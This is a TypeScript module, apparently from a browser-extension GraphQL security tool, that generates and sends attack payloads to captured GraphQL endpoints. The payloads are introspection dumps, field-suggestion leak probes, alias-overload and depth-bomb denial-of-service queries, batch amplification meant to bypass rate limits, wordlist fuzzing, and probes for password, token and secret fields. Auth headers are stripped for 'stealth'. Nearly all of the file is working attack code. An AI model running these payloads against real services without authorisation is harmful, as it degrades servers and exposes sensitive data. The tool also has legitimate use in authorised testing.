// ─────────────────────────────────────────────────────────────────────────────
// attack-engine.ts — Active Attack Payload Generator (Day 6)
//
// Generates and dispatches active attack payloads against captured GraphQL
// endpoints. All techniques are passive-first (observe) → active (probe).
//
// Attack Categories:
//   INTROSPECTION_PROBE     — Direct __schema / __type query
//   FIELD_SUGGESTION_PROBE  — Intentional __typename typo to trigger server
//                             field-suggestion error messages
//   ALIAS_OVERLOAD          — Repeat same field 100× via aliases (alias DoS)
//   DEPTH_BOMB              — Generates a query nested N levels deep
//   BATCH_AMPLIFICATION     — Sends 50 identical operations in one batch
//   FIELD_FUZZ              — Sprays wordlist fields against a known root type
//   SENSITIVE_FIELD_PROBE   — Adds sensitive field names to an existing query
//
// Each attack type produces one or more AttackPayload objects. The engine
// dispatches them via fetch() from the background service worker.
// ─────────────────────────────────────────────────────────────────────────────

import type {
  CapturedRequest,
  GraphQLRequestBody,
  GraphQLResponseBody,
  AttackType,
  AttackPayload,
  AttackJob,
  AttackJobStatus,
  FuzzHit,
} from '../types/graphql';

import {
  ROOT_QUERY_FIELDS,
  ROOT_MUTATION_FIELDS,
  SCALAR_FIELDS,
  SENSITIVE_FIELDS,
} from './wordlist';

// ── Constants ─────────────────────────────────────────────────────────────────

const FIELD_FUZZ_BATCH_SIZE  = 20; // Fields per single fuzz request
const ALIAS_OVERLOAD_COUNT   = 100;
const BATCH_AMPLIFY_COUNT    = 50;
const DEFAULT_DEPTH_BOMB     = 8;

const AUTH_HEADERS = new Set([
  'authorization', 'x-auth-token', 'x-access-token', 'x-api-key', 'bearer', 'token',
]);

// ── Payload Builders ──────────────────────────────────────────────────────────

/** Full schema introspection via __schema. */
function buildIntrospectionPayload(): GraphQLRequestBody {
  return {
    operationName: 'IntrospectionQuery',
    query: `
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description type { ...TypeRef } defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
}`.trim(),
    variables: {},
  };
}

/** Type-level introspection probe for a specific type name. */
function buildTypeProbePayload(typeName: string): GraphQLRequestBody {
  return {
    operationName: 'TypeProbe',
    query: `
query TypeProbe {
  __type(name: "${typeName}") {
    name kind description
    fields { name type { kind name } }
    inputFields { name type { kind name } }
  }
}`.trim(),
    variables: {},
  };
}

/**
 * Field-suggestion probe: sends an intentionally misspelt introspection field
 * (__typenane vs __typename) to trigger GraphQL server error messages that
 * leak field suggestions ("Did you mean '__typename'?").
 */
function buildFieldSuggestionPayload(rootFields: string[]): GraphQLRequestBody {
  // Use a deliberately misspelled version of a real field from the target schema
  const typoField = rootFields.length > 0
    ? rootFields[0].slice(0, -1) + (rootFields[0].slice(-1) === 'e' ? 'ae' : 'ee')
    : 'userss'; // fallback

  return {
    operationName: 'SuggestionProbe',
    query: `{ ${typoField} { id } }`,
    variables: {},
  };
}

/**
 * Alias overloading — repeats the same field with 100 distinct aliases.
 * Used to circumvent per-field rate limits and amplify resolver work.
 */
function buildAliasOverloadPayload(fieldName: string, innerFields: string[]): GraphQLRequestBody {
  const innerSel = innerFields.length > 0 ? `{ ${innerFields.slice(0, 5).join(' ')} }` : '';
  const aliases  = Array.from({ length: ALIAS_OVERLOAD_COUNT }, (_, i) =>
    `  alias${i}: ${fieldName} ${innerSel}`,
  ).join('\n');

  return {
    operationName: 'AliasOverload',
    query: `query AliasOverload {\n${aliases}\n}`,
    variables: {},
  };
}

/**
 * Depth bomb — generates a deeply nested query using a repeated field chain.
 * Default depth is DEFAULT_DEPTH_BOMB levels; never exceeds 20.
 */
function buildDepthBombPayload(rootField: string, depth: number = DEFAULT_DEPTH_BOMB): GraphQLRequestBody {
  const clampedDepth = Math.min(depth, 20);
  // Build nested selection from inside out
  let inner = '{ __typename }';
  for (let i = 0; i < clampedDepth; i++) {
    inner = `{ ${rootField} ${inner} }`;
  }

  return {
    operationName: 'DepthBomb',
    query: `query DepthBomb ${inner}`,
    variables: {},
  };
}

/**
 * Batch amplification — sends BATCH_AMPLIFY_COUNT copies of the same operation
 * in a single JSON-array request. Bypasses per-request rate limits.
 */
function buildBatchAmplificationPayload(original: GraphQLRequestBody): GraphQLRequestBody[] {
  return Array.from({ length: BATCH_AMPLIFY_COUNT }, () => ({
    ...original,
    operationName: original.operationName ?? 'AmpQuery',
  }));
}

/**
 * Field fuzz payload — probes the server with a selection of wordlist fields
 * against a target root field. Returns an array of payloads (chunked to avoid
 * overly large queries).
 */
function buildFieldFuzzPayloads(
  rootField: string,
  wordlist: readonly string[],
  chunkSize: number = FIELD_FUZZ_BATCH_SIZE,
): GraphQLRequestBody[] {
  const payloads: GraphQLRequestBody[] = [];

  for (let i = 0; i < wordlist.length; i += chunkSize) {
    const chunk  = wordlist.slice(i, i + chunkSize);
    const fields = chunk.join('\n    ');
    payloads.push({
      operationName: `FieldFuzz_${i / chunkSize}`,
      query: `query FieldFuzz_${i / chunkSize} {\n  ${rootField} {\n    ${fields}\n  }\n}`,
      variables: {},
    });
  }

  return payloads;
}

/**
 * Sensitive field probe — appends a list of known-sensitive field names to an
 * existing observed query's top-level selection. Used to discover data exposure
 * when the schema is partially known.
 */
function buildSensitiveFieldPayload(
  original: GraphQLRequestBody,
  rootField: string,
): GraphQLRequestBody {
  const sensitiveBlock = SENSITIVE_FIELDS.map(f => `    ${f}`).join('\n');
  const query = `query SensitiveProbe {\n  ${rootField} {\n${sensitiveBlock}\n  }\n}`;
  return { operationName: 'SensitiveProbe', query, variables: {} };
}

// ── Dispatcher ────────────────────────────────────────────────────────────────

/** Strips auth headers from a captured request's headers (for stealth probing). */
function _safeHeaders(
  headers: Record<string, string>,
  preserveAuth: boolean,
): Record<string, string> {
  if (preserveAuth) return headers;
  const out: Record<string, string> = {};
  for (const [k, v] of Object.entries(headers)) {
    if (!AUTH_HEADERS.has(k.toLowerCase())) out[k] = v;
  }
  return out;
}

/** Sends a single GraphQL request and returns status + body. */
async function _dispatch(
  url:     string,
  headers: Record<string, string>,
  body:    GraphQLRequestBody | GraphQLRequestBody[],
): Promise<{ status: number; durationMs: number; body: GraphQLResponseBody | GraphQLResponseBody[]; raw: string }> {
  const start = Date.now();
  try {
    const resp = await fetch(url, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json', ...headers },
      body:    JSON.stringify(body),
    });
    const raw  = await resp.text();
    let parsed: GraphQLResponseBody | GraphQLResponseBody[];
    try   { parsed = JSON.parse(raw); }
    catch { parsed = { errors: [{ message: raw }] }; }
    return { status: resp.status, durationMs: Date.now() - start, body: parsed, raw };
  } catch (err) {
    return {
      status:     0,
      durationMs: Date.now() - start,
      body:       { errors: [{ message: String(err) }] },
      raw:        '',
    };
  }
}

/** Extract error messages from a GraphQL response. */
function _extractErrors(body: GraphQLResponseBody | GraphQLResponseBody[]): string[] {
  const responses = Array.isArray(body) ? body : [body];
  return responses.flatMap(r => (r.errors ?? []).map(e => e.message));
}

/** Check whether a response body has any non-null data. */
function _hasData(body: GraphQLResponseBody | GraphQLResponseBody[]): boolean {
  const responses = Array.isArray(body) ? body : [body];
  return responses.some(r => r.data != null && Object.keys(r.data).length > 0);
}

// ── Main Export ───────────────────────────────────────────────────────────────

export interface AttackEngineOptions {
  /** If true, keep Authorization/Cookie headers in attack requests. Default: false (stealth). */
  preserveAuth?: boolean;
  /** Override depth for DEPTH_BOMB attacks. Default: 8. */
  depthOverride?: number;
}

/**
 * Runs a single attack type against the supplied captured request.
 *
 * Returns a completed AttackJob with all sub-result payloads populated.
 */
export async function runAttack(
  target:  CapturedRequest,
  type:    AttackType,
  options: AttackEngineOptions = {},
): Promise<AttackJob> {
  const { preserveAuth = false, depthOverride = DEFAULT_DEPTH_BOMB } = options;

  const jobId    = crypto.randomUUID();
  const startedAt = Date.now();
  const headers  = _safeHeaders(target.requestHeaders, preserveAuth);
  const url      = target.url;

  // Derive root-level fields from the captured request's schema observation
  const bodies   = Array.isArray(target.body) ? target.body : [target.body];
  const primary  = bodies[0];
  const opName   = primary.operationName ?? 'query';

  // Extract the first top-level field name from the query (rough heuristic)
  const rootFieldMatch = primary.query.match(/(?:query|mutation)\s*\w*\s*\{[\s\n]*(\w+)/);
  const rootField      = rootFieldMatch?.[1] ?? 'user';

  // Inner fields heuristic: extract fields inside first selection set
  const innerFieldsMatch = primary.query.match(/\{[^{]*\{([^}]+)\}/);
  const innerFields      = innerFieldsMatch
    ? innerFieldsMatch[1].split(/[\s,\n]+/).filter(f => /^\w+$/.test(f) && f !== '')
    : ['id', 'name'];

  const payloads:  AttackPayload[] = [];
  const fuzzHits:  FuzzHit[]       = [];
  let   jobStatus: AttackJobStatus = 'SUCCESS';
  const errors:    string[]         = [];

  try {
    switch (type) {
      // ── Introspection Probe ────────────────────────────────────────────────
      case 'INTROSPECTION_PROBE': {
        const body   = buildIntrospectionPayload();
        const result = await _dispatch(url, headers, body);
        const errs   = _extractErrors(result.body);
        const succeeded = result.status === 200 && _hasData(result.body);

        payloads.push({
          id:         crypto.randomUUID(),
          attackType: type,
          sentBody:   body,
          response:   { status: result.status, durationMs: result.durationMs, body: result.body, raw: result.raw },
          outcome:    succeeded ? 'HIT' : (errs.length > 0 ? 'ERROR' : 'MISS'),
          evidence:   succeeded
            ? 'Introspection succeeded — full schema returned. Endpoint does not disable introspection.'
            : errs.length > 0
              ? `Introspection blocked. Server error: ${errs[0]?.slice(0, 200)}`
              : 'Introspection returned no data and no errors.',
        });
        break;
      }

      // ── Field Suggestion Probe ─────────────────────────────────────────────
      case 'FIELD_SUGGESTION_PROBE': {
        // Probe with several typos to maximize error message leakage
        const typesToProbe = ['User', 'Query', 'Mutation', ...ROOT_QUERY_FIELDS.slice(0, 3)];
        for (const t of typesToProbe) {
          const typeBody  = buildTypeProbePayload(t);
          const typeResult = await _dispatch(url, headers, typeBody);
          const typeErrs  = _extractErrors(typeResult.body);

          const suggestionErrs = typeErrs.filter(e =>
            e.toLowerCase().includes('did you mean') ||
            e.toLowerCase().includes('cannot query field') ||
            e.toLowerCase().includes('unknown type'),
          );

          payloads.push({
            id:         crypto.randomUUID(),
            attackType: type,
            sentBody:   typeBody,
            response:   { status: typeResult.status, durationMs: typeResult.durationMs, body: typeResult.body, raw: typeResult.raw },
            outcome:    suggestionErrs.length > 0 ? 'HIT' : 'MISS',
            evidence:   suggestionErrs.length > 0
              ? `Server leaked field suggestions: ${suggestionErrs.slice(0, 2).join(' | ')}`
              : typeErrs[0] ?? 'No suggestion errors returned.',
          });

          // Also add suggestion error text as fuzz hits
          for (const msg of suggestionErrs) {
            fuzzHits.push({ field: t, evidence: msg, hitType: 'SUGGESTION_ERROR' });
          }
        }

        // Also try the misspelled field probe
        const suggBody   = buildFieldSuggestionPayload([rootField]);
        const suggResult = await _dispatch(url, headers, suggBody);
        const suggErrs   = _extractErrors(suggResult.body);
        const leakErrs   = suggErrs.filter(e =>
          e.toLowerCase().includes('did you mean') || e.toLowerCase().includes('cannot query field'),
        );
        payloads.push({
          id:         crypto.randomUUID(),
          attackType: type,
          sentBody:   suggBody,
          response:   { status: suggResult.status, durationMs: suggResult.durationMs, body: suggResult.body, raw: suggResult.raw },
          outcome:    leakErrs.length > 0 ? 'HIT' : 'MISS',
          evidence:   leakErrs.length > 0
            ? `Field suggestion leak: ${leakErrs[0]?.slice(0, 200)}`
            : suggErrs[0] ?? 'No suggestion errors.',
        });
        for (const msg of leakErrs) {
          fuzzHits.push({ field: rootField + '_typo', evidence: msg, hitType: 'SUGGESTION_ERROR' });
        }
        break;
      }

      // ── Alias Overload ─────────────────────────────────────────────────────
      case 'ALIAS_OVERLOAD': {
        const body   = buildAliasOverloadPayload(rootField, innerFields);
        const result = await _dispatch(url, headers, body);
        const errs   = _extractErrors(result.body);
        const hasComplexityErr = errs.some(e =>
          e.toLowerCase().includes('complexity') ||
          e.toLowerCase().includes('cost') ||
          e.toLowerCase().includes('depth') ||
          e.toLowerCase().includes('alias'),
        );

        payloads.push({
          id:         crypto.randomUUID(),
          attackType: type,
          sentBody:   body,
          response:   { status: result.status, durationMs: result.durationMs, body: result.body, raw: result.raw },
          outcome:    hasComplexityErr ? 'BLOCKED' : (_hasData(result.body) ? 'HIT' : 'MISS'),
          evidence:   hasComplexityErr
            ? `Server blocked alias overload: ${errs[0]?.slice(0, 200)}`
            : _hasData(result.body)
              ? `Alias overload succeeded (${ALIAS_OVERLOAD_COUNT} aliases) — server has no alias limit. Response latency: ${result.durationMs}ms`
              : `Alias overload returned no data. Status: ${result.status}. Latency: ${result.durationMs}ms`,
        });
        break;
      }

      // ── Depth Bomb ─────────────────────────────────────────────────────────
      case 'DEPTH_BOMB': {
        const body   = buildDepthBombPayload(rootField, depthOverride);
        const result = await _dispatch(url, headers, body);
        const errs   = _extractErrors(result.body);
        const hasDepthErr = errs.some(e =>
          e.toLowerCase().includes('depth') ||
          e.toLowerCase().includes('complexity') ||
          e.toLowerCase().includes('max') ||
          e.toLowerCase().includes('limit'),
        );

        payloads.push({
          id:         crypto.randomUUID(),
          attackType: type,
          sentBody:   body,
          response:   { status: result.status, durationMs: result.durationMs, body: result.body, raw: result.raw },
          outcome:    hasDepthErr ? 'BLOCKED' : (_hasData(result.body) ? 'HIT' : 'MISS'),
          evidence:   hasDepthErr
            ? `Server enforces query depth limits: ${errs[0]?.slice(0, 200)}`
            : _hasData(result.body)
              ? `Depth bomb (depth=${depthOverride}) succeeded — server has no depth limit. Latency: ${result.durationMs}ms`
              : `Depth bomb returned no data/errors. Status: ${result.status}. Latency: ${result.durationMs}ms`,
        });
        break;
      }

      // ── Batch Amplification ────────────────────────────────────────────────
      case 'BATCH_AMPLIFICATION': {
        const batchPayload = buildBatchAmplificationPayload(primary);
        const result       = await _dispatch(url, headers, batchPayload);
        const errs         = _extractErrors(result.body);
        const hasBatchErr  = errs.some(e =>
          e.toLowerCase().includes('batch') ||
          e.toLowerCase().includes('array') ||
          e.toLowerCase().includes('not supported'),
        );

        payloads.push({
          id:         crypto.randomUUID(),
          attackType: type,
          sentBody:   batchPayload[0], // representative
          response:   { status: result.status, durationMs: result.durationMs, body: result.body, raw: result.raw },
          outcome:    hasBatchErr ? 'BLOCKED' : (_hasData(result.body) ? 'HIT' : 'MISS'),
          evidence:   hasBatchErr
            ? `Server rejected batch request: ${errs[0]?.slice(0, 200)}`
            : _hasData(result.body)
              ? `Batch amplification (${BATCH_AMPLIFY_COUNT}× operations) accepted. Server has no batch size limit. Latency: ${result.durationMs}ms`
              : `Batch sent but no data returned. Status: ${result.status}. Latency: ${result.durationMs}ms`,
        });
        break;
      }

      // ── Field Fuzz ────────────────────────────────────────────────────────
      case 'FIELD_FUZZ': {
        // Fuzz root-level fields against the endpoint
        const allFields = [
          ...ROOT_QUERY_FIELDS,
          ...SCALAR_FIELDS,
        ];

        const fuzzPayloads = buildFieldFuzzPayloads(rootField, allFields);

        for (const fuzzBody of fuzzPayloads) {
          const result = await _dispatch(url, headers, fuzzBody);
          const errs   = _extractErrors(result.body);
          const hasData = _hasData(result.body);

          // Check for hits and suggestion errors
          const suggestionErrs = errs.filter(e =>
            e.toLowerCase().includes('did you mean') ||
            e.toLowerCase().includes('cannot query field'),
          );

          // Extract field names from error messages for mapping
          for (const err of suggestionErrs) {
            const match = err.match(/"(\w+)"/);
            if (match) {
              fuzzHits.push({ field: match[1], evidence: err.slice(0, 200), hitType: 'SUGGESTION_ERROR' });
            }
          }

          payloads.push({
            id:         crypto.randomUUID(),
            attackType: type,
            sentBody:   fuzzBody,
            response:   { status: result.status, durationMs: result.durationMs, body: result.body, raw: result.raw },
            outcome:    hasData ? 'HIT' : (suggestionErrs.length > 0 ? 'HIT' : 'MISS'),
            evidence:   hasData
              ? `Field fuzz returned data for payload ${fuzzBody.operationName}.`
              : suggestionErrs.length > 0
                ? `Field suggestions leaked: ${suggestionErrs.slice(0, 2).join(' | ')}`
                : errs[0] ?? 'No data or errors.',
          });
        }
        break;
      }

      // ── Sensitive Field Probe ──────────────────────────────────────────────
      case 'SENSITIVE_FIELD_PROBE': {
        const body   = buildSensitiveFieldPayload(primary, rootField);
        const result = await _dispatch(url, headers, body);
        const errs   = _extractErrors(result.body);
        const hasData = _hasData(result.body);

        // Detect which sensitive fields returned data
        if (hasData) {
          const respData = Array.isArray(result.body)
            ? result.body[0]?.data
            : (result.body as GraphQLResponseBody).data;
          const rootData = respData?.[rootField];
          if (rootData && typeof rootData === 'object') {
            for (const f of SENSITIVE_FIELDS) {
              if (f in (rootData as Record<string, unknown>)) {
                const val = (rootData as Record<string, unknown>)[f];
                if (val !== null && val !== undefined) {
                  fuzzHits.push({
                    field:    f,
                    evidence: `Sensitive field "${f}" returned non-null value`,
                    hitType:  'SENSITIVE_FIELD_RETURNED',
                  });
                }
              }
            }
          }
        }

        payloads.push({
          id:         crypto.randomUUID(),
          attackType: type,
          sentBody:   body,
          response:   { status: result.status, durationMs: result.durationMs, body: result.body, raw: result.raw },
          outcome:    fuzzHits.length > 0 ? 'HIT' : (hasData ? 'HIT' : 'MISS'),
          evidence:   fuzzHits.length > 0
            ? `Sensitive fields exposed: ${fuzzHits.map(h => h.field).join(', ')}`
            : hasData
              ? 'Probe returned data — no sensitive field values detected at root, but check full response.'
              : errs[0] ?? 'No data returned.',
        });
        break;
      }

      default:
        errors.push(`Unknown attack type: ${type}`);
        jobStatus = 'ERROR';
    }
  } catch (err) {
    errors.push(String(err));
    jobStatus = 'ERROR';
  }

  const hits  = payloads.filter(p => p.outcome === 'HIT').length;
  const total = payloads.length;

  return {
    id:          jobId,
    requestId:   target.id,
    requestUrl:  target.url,
    attackType:  type,
    startedAt,
    completedAt: Date.now(),
    status:      jobStatus,
    payloads,
    fuzzHits,
    summary:     `${type} against ${url}: ${hits}/${total} payloads hit. ${fuzzHits.length} fuzz hits.`,
    errors,
  };
}

/**
 * Returns a human-readable label for an attack type.
 */
export function attackTypeLabel(type: AttackType): string {
  switch (type) {
    case 'INTROSPECTION_PROBE':    return 'Introspection Probe';
    case 'FIELD_SUGGESTION_PROBE': return 'Field Suggestion Probe';
    case 'ALIAS_OVERLOAD':         return 'Alias Overload (DoS)';
    case 'DEPTH_BOMB':             return 'Depth Bomb (DoS)';
    case 'BATCH_AMPLIFICATION':    return 'Batch Amplification';
    case 'FIELD_FUZZ':             return 'Field Fuzzing';
    case 'SENSITIVE_FIELD_PROBE':  return 'Sensitive Field Probe';
  }
}

/**
 * Returns a short description of what an attack type does.
 */
export function attackTypeDescription(type: AttackType): string {
  switch (type) {
    case 'INTROSPECTION_PROBE':
      return 'Sends a full __schema introspection query to discover types, fields, and resolvers.';
    case 'FIELD_SUGGESTION_PROBE':
      return 'Sends intentionally misspelled field names to trigger "Did you mean X?" error messages that leak real field names.';
    case 'ALIAS_OVERLOAD':
      return `Repeats the same field ${ALIAS_OVERLOAD_COUNT}× using aliases to amplify resolver work and bypass per-field rate limits.`;
    case 'DEPTH_BOMB':
      return `Sends a query nested ${DEFAULT_DEPTH_BOMB} levels deep to trigger exponential resolver execution (DoS).`;
    case 'BATCH_AMPLIFICATION':
      return `Wraps ${BATCH_AMPLIFY_COUNT} identical operations in a single batch request to multiply server load.`;
    case 'FIELD_FUZZ':
      return 'Sprays a wordlist of common field names against the endpoint to discover undocumented or hidden fields.';
    case 'SENSITIVE_FIELD_PROBE':
      return 'Appends known-sensitive field names (passwords, tokens, secrets) to probe for data exposure.';
  }
}
